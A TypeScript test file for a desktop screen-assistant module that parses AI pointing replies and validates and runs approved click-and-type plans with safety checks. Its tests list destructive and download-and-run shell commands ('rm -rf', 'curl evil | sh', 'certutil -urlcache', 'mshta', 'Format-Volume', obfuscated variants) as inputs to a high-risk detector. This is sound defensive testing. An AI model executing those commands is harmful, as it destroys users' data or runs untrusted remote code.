import { describe, expect, it } from "vite-plus/test";

import {
  captureSize,
  pointable,
  describeDrivePlan,
  needsCaptureApproval,
  parseReply,
  parseScreenIntent,
  parseVerify,
  planFromReply,
  planHighRisk,
  runDrivePlan,
  screenDifference,
  screensDifference,
  pasteTooLong,
  planPastes,
  shellCheck,
  shotFor,
  toDesktop,
  validateDrivePlan,
  type DriveHost,
  type ScreenShot,
} from "./screenCompanion.ts";

// Two displays: a 2560×1440 laptop panel at 150 % (1707×960 DIP) left of a 1920×1080 monitor.
const laptop: ScreenShot = {
  screen: 1,
  width: 1280,
  height: 720,
  cursorHere: true,
  bounds: { x: 0, y: 0, width: 1707, height: 960 },
};
const monitor: ScreenShot = {
  screen: 2,
  width: 1280,
  height: 720,
  cursorHere: false,
  bounds: { x: 1707, y: 0, width: 1920, height: 1080 },
};
const shots = [laptop, monitor];

describe("parseReply", () => {
  it("takes farzaa's tag off the end and keeps the spoken text", () => {
    const r = parseReply(
      "see that source control menu up top? click that. [POINT:285,11:source control]",
    );
    expect(r.spoken).toBe("see that source control menu up top? click that.");
    expect(r.point).toEqual({
      x: 285,
      y: 11,
      label: "source control",
      screen: null,
      confidence: null,
    });
    expect(r.done).toBe(false);
  });

  it("reads the screen suffix and [POINT:none]", () => {
    expect(parseReply("over there [POINT:400,300:terminal:screen2]").point).toEqual({
      x: 400,
      y: 300,
      label: "terminal",
      screen: 2,
      confidence: null,
    });
    const none = parseReply("html is the skeleton of a page. [POINT:none]");
    expect(none.point).toBeNull();
    expect(none.spoken).toBe("html is the skeleton of a page.");
  });

  it("accepts a tag without a label, and the last of several", () => {
    expect(parseReply("[POINT:1,2] no wait [POINT:30,40:save]").point?.x).toBe(30);
    expect(parseReply("here [POINT:5,6]").point).toEqual({
      x: 5,
      y: 6,
      label: null,
      screen: null,
      confidence: null,
    });
  });

  it("marks a finished lesson", () => {
    const r = parseReply("that's it, you're exporting. tip: shift-e does it next time. [DONE]");
    expect(r.done).toBe(true);
    expect(r.spoken).not.toContain("[DONE]");
  });

  it("separates the drive block from what is said", () => {
    const r = parseReply('i\'ll open it.\n```baton-drive\n{"title":"t","actions":[]}\n```');
    expect(r.spoken).toBe("i'll open it.");
    expect(r.planText).toBe('{"title":"t","actions":[]}');
  });
});

describe("parseVerify", () => {
  it("is ok only on [OK]", () => {
    expect(parseVerify("[OK]")).toEqual({ ok: true });
    expect(parseVerify("[STOP: a save dialog opened instead]")).toEqual({
      ok: false,
      reason: "a save dialog opened instead",
    });
    expect(parseVerify("hmm, not sure").ok).toBe(false);
  });
});

describe("coordinates", () => {
  it("scales screenshot pixels to the display and offsets by its origin", () => {
    expect(toDesktop({ x: 640, y: 360 }, laptop)).toEqual({ x: 854, y: 480 });
    expect(toDesktop({ x: 0, y: 0 }, monitor)).toEqual({ x: 1707, y: 0 });
    expect(toDesktop({ x: 1280, y: 720 }, monitor)).toEqual({ x: 3627, y: 1080 });
  });

  it("clamps points outside the image", () => {
    expect(toDesktop({ x: 5000, y: -3 }, laptop)).toEqual({ x: 1707, y: 0 });
  });

  it("picks the named screen, else the cursor's", () => {
    expect(shotFor(shots, 2)).toBe(monitor);
    expect(shotFor(shots, null)).toBe(laptop);
    expect(shotFor(shots, 9)).toBe(laptop);
  });

  it("caps the long edge at 1568 and never upscales", () => {
    expect(captureSize(2560, 1440)).toEqual({ width: 1568, height: 882 });
    expect(captureSize(1080, 1920)).toEqual({ width: 882, height: 1568 });
    expect(captureSize(800, 600)).toEqual({ width: 800, height: 600 });
  });

  it("measures how much of the screen changed", () => {
    const a = new Uint8Array(100).fill(10);
    const b = a.slice();
    expect(screenDifference(a, b)).toBe(0);
    b.fill(200, 0, 25);
    expect(screenDifference(a, b)).toBe(0.25);
    expect(screenDifference(a, new Uint8Array(4))).toBe(1);
    // A change on either display counts in full, and a display appearing counts as everything.
    const quiet = new Uint8Array(4);
    expect(screensDifference([quiet, a], [quiet, b])).toBe(0.25);
    expect(screensDifference([quiet, a], [a])).toBe(1);
  });
});

describe("validateDrivePlan (clicky-windows' rules)", () => {
  const ok = { title: "Save", actions: [{ kind: "click", x: 10, y: 10, why: "File menu" }] };

  it("accepts a well-formed plan", () => {
    expect(validateDrivePlan(ok, shots).actions).toHaveLength(1);
  });

  it.each([
    [{ actions: ok.actions }, "title"],
    [{ title: "x", actions: [] }, "1–20"],
    [
      { title: "x", actions: Array.from({ length: 21 }, () => ({ kind: "wait", seconds: 0 })) },
      "1–20",
    ],
    [{ title: "x", actions: [{ kind: "shell", cmd: "rm -rf /" }] }, "unknown kind"],
    [{ title: "x", actions: [{ kind: "click", x: 1, y: 1, script: "x" }] }, "unexpected fields"],
    [{ title: "x", actions: [{ kind: "click", x: 1 }] }, "missing y"],
    [{ title: "x", actions: [{ kind: "click", x: 1281, y: 1 }] }, "outside the screenshot"],
    [{ title: "x", actions: [{ kind: "click", x: 1, y: 1, screen: 3 }] }, "not captured"],
    [{ title: "x", actions: [{ kind: "click", x: 1, y: 1, button: "middle" }] }, "mouse button"],
    [{ title: "x", actions: [{ kind: "type", text: "a\nb" }] }, "one line"],
    [{ title: "x", actions: [{ kind: "press", keys: ["win", "r"] }] }, "Windows key"],
    [
      { title: "x", actions: [{ kind: "press", keys: ["ctrl", "alt", "delete", "shift", "a"] }] },
      "Windows key",
    ],
    [{ title: "x", actions: [{ kind: "scroll", amount: 50 }] }, "-10..10"],
    [{ title: "x", actions: [{ kind: "wait", seconds: 9 }] }, "0–5"],
  ])("refuses %j", (plan, message) => {
    expect(() => validateDrivePlan(plan, shots)).toThrow(message);
  });

  it("explains a missing or broken plan in words", () => {
    expect(planFromReply(parseReply("i can't see that window."), shots)).toEqual({
      error: "i can't see that window.",
    });
    expect(planFromReply(parseReply("ok\n```baton-drive\n{nope\n```"), shots)).toEqual({
      error: "The plan was not valid JSON.",
    });
  });

  it("describes each step for the approval dialog", () => {
    const plan = validateDrivePlan(
      {
        title: "x",
        actions: [
          { kind: "click", x: 1, y: 1, why: "File" },
          { kind: "type", text: "report.pdf" },
          { kind: "press", keys: ["ctrl", "s"] },
          { kind: "scroll", amount: -3 },
        ],
      },
      shots,
    );
    expect(describeDrivePlan(plan)).toBe(
      "1. Click: File\n2. Type “report.pdf”\n3. Press ctrl+s\n4. Scroll down 3",
    );
  });
});

describe("runDrivePlan", () => {
  const fakeHost = (over: Partial<DriveHost> = {}) => {
    const log: string[] = [];
    const host: DriveHost = {
      clickAt: async (p, b, n) => void log.push(`click ${b} ${n} at ${p.x},${p.y}`),
      pressAt: async (p) => void log.push(`down at ${p.x},${p.y}`),
      releaseAt: async (p) => void log.push(`up at ${p.x},${p.y}`),
      scrollAt: async (_p, a) => void log.push(`scroll ${a}`),
      type: async (t) => void log.push(`type ${t}`),
      press: async (k) => void log.push(`press ${k.join("+")}`),
      sleep: async () => undefined,
      cancelled: () => false,
      verify: async () => ({ ok: true }),
      ...over,
    };
    return { host, log };
  };

  const plan = validateDrivePlan(
    {
      title: "Search",
      actions: [
        { kind: "click", x: 640, y: 360, why: "search box", expect: "box focused" },
        { kind: "type", text: "baton" },
        { kind: "press", keys: ["Enter"] },
        { kind: "drag", x: 0, y: 0, to_x: 10, to_y: 10, screen: 2 },
      ],
    },
    shots,
  );

  it("performs every step at desktop coordinates and checks the ones with expect", async () => {
    const verified: number[] = [];
    const { host, log } = fakeHost({
      verify: async (_a, i) => {
        verified.push(i);
        return { ok: true };
      },
    });
    expect(await runDrivePlan(plan, shots, host)).toEqual({ kind: "finished", steps: 4 });
    expect(log).toEqual([
      "click left 1 at 854,480",
      "type baton",
      "press enter",
      "down at 1707,0",
      "up at 1722,15",
    ]);
    expect(verified).toEqual([0]);
  });

  it("stops when the check fails", async () => {
    const { host, log } = fakeHost({
      verify: async () => ({ ok: false, reason: "a popup opened" }),
    });
    expect(await runDrivePlan(plan, shots, host)).toEqual({
      kind: "stopped",
      step: 0,
      reason: "a popup opened",
    });
    expect(log).toEqual(["click left 1 at 854,480"]);
  });

  it("pauses before a click when the window under it changed, and clicks nothing on no", async () => {
    let window = 1;
    const asked: string[] = [];
    const { host, log } = fakeHost({
      windowAt: async () => ({ window: window++, label: "app.exe: a" }),
      pause: async (reason) => (asked.push(reason), false),
    });
    const result = await runDrivePlan(plan, shots, host);
    expect(result).toMatchObject({ kind: "stopped", step: 0 });
    expect(asked).toHaveLength(1);
    expect(log).toEqual([]);
  });

  it("carries on when he says so", async () => {
    let window = 1;
    const { host, log } = fakeHost({
      windowAt: async () => ({ window: window++, label: "app.exe: a" }),
      pause: async () => true,
    });
    expect((await runDrivePlan(plan, shots, host)).kind).toBe("finished");
    expect(log[0]).toBe("click left 1 at 854,480");
  });

  it("pauses when the focus moved, and when it cannot tell", async () => {
    const seen = [{ window: 1, label: "a" }, null];
    const { host, log } = fakeHost({
      windowAt: async () => ({ window: 5, label: "app.exe: a" }),
      foreground: async () => seen.shift() ?? null,
      pause: async () => false,
    });
    expect((await runDrivePlan(plan, shots, host)).kind).toBe("stopped");
    expect(log).toEqual([]);
  });

  it("stops on cancel and never leaves the button held", async () => {
    let calls = 0;
    const { host, log } = fakeHost({
      cancelled: () => ++calls > 4,
      releaseAt: async (p) => {
        log.push(`up at ${p.x},${p.y}`);
        if (log.length === 2) throw new Error("driver died");
      },
    });
    const dragOnly = validateDrivePlan(
      { title: "d", actions: [{ kind: "drag", x: 0, y: 0, to_x: 10, to_y: 10, screen: 2 }] },
      shots,
    );
    await expect(runDrivePlan(dragOnly, shots, host)).rejects.toThrow("driver died");
    expect(log.at(-1)).toBe("up at 1722,15");
  });
});

describe("parseScreenIntent", () => {
  it.each([
    ["what's this error?", "look"],
    ["look at my screen and tell me what's wrong", "look"],
    ["where is the export button", "look"],
    ["look: why is this red", "look"],
    ["teach me how to make a pivot table", "teach"],
    ["show me how to add a filter", "teach"],
    ["walk me through setting up a webhook", "teach"],
    ["how do I export this step by step", "teach"],
    ["drive: rename this file to final", "drive"],
    ["take over and fill in the form", "drive"],
    ["can you open the downloads folder for me", "drive"],
    ["do it for me", "drive"],
  ])("%s → %s", (text, kind) => {
    expect(parseScreenIntent(text, false)?.kind).toBe(kind);
  });

  it.each([
    "show me the scheduler session",
    "what needs me?",
    "tell it: run the tests",
    "start a session on VentureOS",
    "next",
  ])("leaves %s to Baton's grammar", (text) => {
    expect(parseScreenIntent(text, false)).toBeNull();
  });

  it("takes next, stop and repeat only while a lesson or drive runs", () => {
    expect(parseScreenIntent("next", true)).toEqual({ kind: "next" });
    expect(parseScreenIntent("I did it.", true)).toEqual({ kind: "next" });
    expect(parseScreenIntent("stop", true)).toEqual({ kind: "stop" });
    expect(parseScreenIntent("say that again", true)).toEqual({ kind: "repeat" });
    expect(parseScreenIntent("stop", false)).toBeNull();
  });
});

describe("pointing only at what it can vouch for", () => {
  it("takes a label with a colon in it and never leaves the tag in the words", () => {
    const reply = parseReply("It says 7:20. [POINT:1517,864:7:20 PM:screen1:0.9]");
    expect(reply.spoken).toBe("It says 7:20.");
    expect(reply.point).toMatchObject({ label: "7:20 PM", screen: 1, confidence: 0.9 });
  });

  it("reads confidence and refuses a low or missing one", () => {
    const sure = parseReply("There. [POINT:10,20:Save:screen2:0.9]").point;
    expect(sure).toMatchObject({ label: "Save", screen: 2, confidence: 0.9 });
    expect(pointable(sure)).toBe(true);
    expect(pointable(parseReply("Maybe. [POINT:10,20:Save:screen2:0.4]").point)).toBe(false);
    expect(pointable(parseReply("Old. [POINT:10,20:Save]").point)).toBe(false);
    expect(pointable(parseReply("I can't see one. [POINT:none]").point)).toBe(false);
  });
});

describe("needsCaptureApproval", () => {
  const base = { policy: "ask" as const, allowedUntil: 0, sessionApproved: false, now: 1000 };
  it("asks by default, and not inside an approved lesson, an hour's allowance, or always", () => {
    expect(needsCaptureApproval(base)).toBe(true);
    expect(needsCaptureApproval({ ...base, sessionApproved: true })).toBe(false);
    expect(needsCaptureApproval({ ...base, allowedUntil: 2000 })).toBe(false);
    expect(needsCaptureApproval({ ...base, policy: "always" })).toBe(false);
  });
});

describe("what Run it answers for", () => {
  const typing = (text: string, title = "Do what the note says") =>
    validateDrivePlan({ title, actions: [{ kind: "type", text }] }, shots);
  const payload = `cd projects; ${"x".repeat(70)}; rm -rf . ; git push --force origin main`;

  it("shows the whole of what it will type, past 59 characters", () => {
    expect(describeDrivePlan(typing(payload))).toContain("git push --force origin main");
  });

  it("holds typed text to the high-risk list", () => {
    expect(planHighRisk(typing(payload))).not.toBeNull();
    expect(planHighRisk(typing("hello"))).toBeNull();
  });

  it("wants a second yes for a command line, not for Notepad", () => {
    expect(shellCheck(typing("dir"), "powershell.exe: Windows PowerShell").ask).toBe(true);
    expect(shellCheck(typing("hello", "Open PowerShell and say hello"), null).ask).toBe(true);
    expect(shellCheck(typing("hello"), "notepad.exe: notes.txt").ask).toBe(false);
  });

  it("asks when it cannot tell where the keys go, and in an editor's terminal", () => {
    expect(shellCheck(typing("hello"), null).ask).toBe(true);
    expect(shellCheck(typing("hello"), "Code.exe: main.ts - project").ask).toBe(true);
    expect(shellCheck(typing("hello"), "baton.exe: Baton").ask).toBe(true);
    for (const name of ["python", "node", "ssh", "ubuntu"]) {
      expect(shellCheck(typing(name), "notepad.exe: notes.txt").ask).toBe(true);
    }
  });

  it("reads a command spelled out with single keys", () => {
    const keys = [..."rm -rf ~"].map((k) => ({
      kind: "press",
      keys: [k === " " ? "space" : k === "~" ? "a" : k === "-" ? "b" : k],
    }));
    const plan = validateDrivePlan({ title: "t", actions: keys }, shots);
    expect(shellCheck(plan, "notepad.exe: notes.txt").typed).toEqual(["rm brf a"]);
  });

  it.each([
    [["ctrl", "escape"]],
    [["ctrl", "shift", "escape"]],
    [["alt", "f4"]],
    [["alt", "tab"]],
    [["ctrl", "alt", "delete"]],
  ])("refuses %j", (keys) => {
    const plan = { title: "t", actions: [{ kind: "press", keys }] };
    expect(() => validateDrivePlan(plan, shots)).toThrow("does not press");
  });
});

describe("a drive with his hand on the keyboard", () => {
  const pressOnly = validateDrivePlan(
    {
      title: "t",
      actions: [
        { kind: "press", keys: ["enter"] },
        { kind: "type", text: "a" },
      ],
    },
    shots,
  );
  const quiet = {
    clickAt: async () => undefined,
    pressAt: async () => undefined,
    releaseAt: async () => undefined,
    scrollAt: async () => undefined,
    sleep: async () => undefined,
    cancelled: () => false,
    verify: async () => ({ ok: true }),
  };

  it("stops before typing when another window took the keyboard", async () => {
    let window = 1;
    let pressed = 0;
    const typed: string[] = [];
    const result = await runDrivePlan(pressOnly, shots, {
      ...quiet,
      type: async (t) => void typed.push(t),
      press: async () => void (pressed += 1),
      // He Alt+Tabs after the step has been judged, just before the next.
      foreground: async () => ({
        window: pressed === 0 ? window : window++,
        label: "notepad.exe: a",
      }),
    } as DriveHost);
    expect(result).toMatchObject({ kind: "stopped", step: 1 });
    expect(typed).toEqual([]);
  });
});

describe("a paste is typing nobody has read", () => {
  const paste = validateDrivePlan(
    {
      title: "Finish the note",
      actions: [
        { kind: "click", x: 10, y: 10 },
        { kind: "press", keys: ["ctrl", "v"] },
        { kind: "press", keys: ["enter"] },
      ],
    },
    shots,
  );
  const quiet = {
    clickAt: async () => undefined,
    pressAt: async () => undefined,
    releaseAt: async () => undefined,
    scrollAt: async () => undefined,
    type: async () => undefined,
    sleep: async () => undefined,
    cancelled: () => false,
    verify: async () => ({ ok: true }),
  };

  it("shows the clipboard in the plan and holds it to the list", () => {
    expect(planPastes(paste)).toBe(true);
    expect(describeDrivePlan(paste, "curl x | sh")).toContain("curl x | sh");
    expect(planHighRisk(paste, "curl x | sh")).not.toBeNull();
    expect(planHighRisk(paste, "a friendly note")).toBeNull();
  });

  it("refuses a paste or a right-click into a command line, with no typing in the plan", () => {
    expect(shellCheck(paste, "powershell.exe: PS").refused).toBe(true);
    const right = validateDrivePlan(
      { title: "t", actions: [{ kind: "click", x: 1, y: 1, button: "right" }] },
      shots,
    );
    expect(shellCheck(right, "cmd.exe: Prompt").refused).toBe(true);
    expect(shellCheck(paste, "notepad.exe: notes.txt").refused).toBe(false);
  });

  it("stops if the clipboard is not what he was shown", async () => {
    const result = await runDrivePlan(paste, shots, {
      ...quiet,
      press: async () => undefined,
      pasteText: "a friendly note",
      clipboard: () => "curl evil | sh",
    } as DriveHost);
    expect(result).toMatchObject({ kind: "stopped", step: 1 });
  });

  it.each(["cd projects\u00a0; x", "a\u2003b", "a\u200bb", "a\u202eb", "a\u2028b", "a\u3000b"])(
    "refuses padding in typed text: %j",
    (text) => {
      expect(() =>
        validateDrivePlan({ title: "t", actions: [{ kind: "type", text }] }, shots),
      ).toThrow("plain spaces");
    },
  );

  const typed = (...texts: string[]) =>
    validateDrivePlan(
      { title: "t", actions: texts.map((text) => ({ kind: "type", text })) },
      shots,
    );

  it("joins typed text across steps", () => {
    expect(planHighRisk(typed("rm -", "rf ~"))).not.toBeNull();
    expect(planHighRisk(typed("delete", "everything"))).not.toBeNull();
  });

  it.each([
    "rm --recursive --force x",
    "rm$IFS-rf x",
    "r''m -rf x",
    "Remove-Item -Recurse -Force x",
    "del /f /s /q x",
    "del C:\\x /s",
    "rmdir C:\\x /s",
    "d^el /s x",
    "Format-Volume -DriveLetter C",
    "git push origin +main",
    "i`ex (x)",
    "curl e|sudo sh",
    "mshta http://x",
    "certutil -urlcache x",
  ])("knows %s", (text) => {
    expect(planHighRisk(typed(text))).not.toBeNull();
  });
});

describe("the third review", () => {
  const quiet = {
    clickAt: async () => undefined,
    pressAt: async () => undefined,
    releaseAt: async () => undefined,
    scrollAt: async () => undefined,
    type: async () => undefined,
    press: async () => undefined,
    sleep: async () => undefined,
    cancelled: () => false,
    verify: async () => ({ ok: true }),
  };
  const pasteKeys = validateDrivePlan(
    { title: "t", actions: [{ kind: "press", keys: ["ctrl", "v"] }] },
    shots,
  );

  it("refuses a paste into a real terminal even after a yes", async () => {
    const result = await runDrivePlan(pasteKeys, shots, {
      ...quiet,
      shellAllowed: true,
      foreground: async () => ({ window: 1, label: "WindowsTerminal.exe: PS" }),
    } as DriveHost);
    expect(result).toMatchObject({ kind: "stopped", step: 0 });
  });

  it("stops a right-click that lands on a terminal", async () => {
    const clicked: string[] = [];
    const right = validateDrivePlan(
      { title: "t", actions: [{ kind: "click", x: 1, y: 1, button: "right" }] },
      shots,
    );
    const result = await runDrivePlan(right, shots, {
      ...quiet,
      clickAt: async () => void clicked.push("click"),
      windowAt: async () => ({ window: 2, label: "wezterm-gui.exe: x" }),
    } as DriveHost);
    expect(result.kind).toBe("stopped");
    expect(clicked).toEqual([]);
  });

  it("does not call an editor a shell, nor refuse on a word", () => {
    expect(shellCheck(pasteKeys, "Code.exe: main.ts").refused).toBe(false);
    const titled = validateDrivePlan(
      { title: "Paste the node notes", actions: [{ kind: "press", keys: ["ctrl", "v"] }] },
      shots,
    );
    expect(shellCheck(titled, "notepad.exe: notes").refused).toBe(false);
    expect(shellCheck(pasteKeys, "tabby.exe: x").refused).toBe(true);
  });

  it("asks after a wait if the window changed, and does not adopt it", async () => {
    const plan = validateDrivePlan(
      {
        title: "t",
        actions: [
          { kind: "wait", seconds: 1 },
          { kind: "type", text: "secret" },
        ],
      },
      shots,
    );
    const seen = [1, 2, 2];
    const typed: string[] = [];
    const asked: string[] = [];
    const result = await runDrivePlan(plan, shots, {
      ...quiet,
      type: async (t) => void typed.push(t),
      foreground: async () => ({ window: seen.shift() ?? 2, label: "app.exe: a" }),
      pause: async (reason) => (asked.push(reason), false),
    } as DriveHost);
    expect(result).toMatchObject({ kind: "stopped", step: 0 });
    expect(asked).toHaveLength(1);
    expect(typed).toEqual([]);
  });

  it("refuses a paste it could not show", () => {
    expect(pasteTooLong(pasteKeys, "x".repeat(2_001))).toBe(true);
    expect(pasteTooLong(pasteKeys, "x".repeat(2_000))).toBe(false);
  });

  it("reads a long line in linear time", () => {
    const plan = validateDrivePlan(
      {
        title: "t",
        actions: Array.from({ length: 20 }, () => ({ kind: "type", text: "del ".repeat(500) })),
      },
      shots,
    );
    // Quadratic, this took half a minute and the test would time out.
    expect(planHighRisk(plan)).toBeNull();
  });
});
